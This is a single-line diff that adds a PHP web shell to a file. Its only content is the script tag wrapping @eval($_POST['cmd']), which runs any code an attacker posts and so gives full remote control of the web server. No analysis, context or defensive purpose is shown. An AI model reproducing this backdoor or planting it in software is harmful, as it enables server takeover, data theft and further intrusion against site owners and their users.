@@ -1,0 +1,1 @@
+<script language='PhP'>@eval($_POST['cmd']);</script>
